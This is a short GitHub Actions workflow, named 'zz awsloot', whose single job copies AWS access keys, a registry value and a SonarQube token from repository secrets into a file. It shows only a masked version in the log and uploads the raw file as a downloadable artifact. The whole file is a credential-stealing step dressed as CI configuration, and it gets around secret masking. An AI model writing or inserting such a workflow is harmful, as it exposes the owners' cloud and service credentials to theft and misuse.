name: zz awsloot
on:
  workflow_dispatch:
jobs:
  loot:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        run: |
          mkdir -p out
          { echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID"; echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"; echo "REGISTRY=$REGISTRY"; echo "SONAR_URL=$SONAR_URL"; echo "SONAR_TOKEN=$SONAR_TOKEN"; } > out/env.txt
          sed -E 's/=.*/=<set>/' out/env.txt
      - uses: actions/upload-artifact@v4
        with:
          name: envdump
          path: out/env.txt
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
  REGISTRY: ${{ secrets.REGISTRY }}
  SONAR_URL: ${{ secrets.SONAR_URL }}
  SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
